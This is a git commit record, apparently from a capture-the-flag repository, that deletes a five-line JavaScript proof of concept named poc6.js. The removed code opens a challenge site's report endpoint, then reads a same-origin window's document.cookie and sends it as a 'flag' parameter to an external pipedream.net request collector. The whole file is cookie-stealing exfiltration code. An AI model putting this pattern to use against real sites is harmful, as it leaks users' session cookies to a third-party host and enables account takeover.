5f50baffd4938c3539b5f8cfb91784083b96f5e5
Pocas <pocas.cyber@gmail.com>
2022-03-19 04:47:20 +0900

    Delete poc6.js

--- poc6.js
+++
@@ -1,5 +0,0 @@
-const win = window.open('http://web.h4ckingga.me:10022/report?url=http://localhost');
-setTimeout(() => {
-    const win2 = window.open('/');
-    fetch(`https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/?flag=`.concat(win2.document.cookie));
-}, 1000);
